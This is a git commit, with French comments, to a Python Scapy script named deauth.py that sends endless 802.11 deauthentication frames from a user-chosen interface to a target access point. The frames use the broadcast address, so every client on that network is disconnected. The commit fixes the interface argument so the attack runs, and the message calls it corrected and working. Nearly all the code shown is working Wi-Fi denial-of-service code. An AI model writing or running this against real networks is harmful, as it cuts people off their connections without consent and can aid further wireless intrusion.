e9b49ec3f7fdd1047b3751ff5483b97e174a76eb
js <auge1@hotmail.fr>
2021-01-09 12:12:51 +0100

    deauth corrigé et fonctionnel

--- deauth.py
+++ deauth.py
@@ -5,9 +5,9 @@ import os
 print("Module de deauth: ")
 interface=input("Veuillez entrer le nom de votre interface wifi (iwconfig pour la connaitre)")
 AP_cible=input("veuillez entrer l'adresse du pont d'acces cible: ")
-adresse_cible='ff:ff:ff:ff:ff:ff' #on attaque toutes les cibles
+adresse_cible="ff:ff:ff:ff:ff:ff" #on attaque toutes les cibles
 dot11 = Dot11(type=0,subtype=12,addr1=adresse_cible,addr2=AP_cible,addr3=AP_cible)
 packet = RadioTap()/dot11/Dot11Deauth(reason=7)
 while True:
 	print("Envoi d'un paquet de deauth vers %s" %AP_cible)
-	sendp(packet, IFACE='ca:0b:f9:37:bd:3f')
+	sendp(packet, iface=interface)
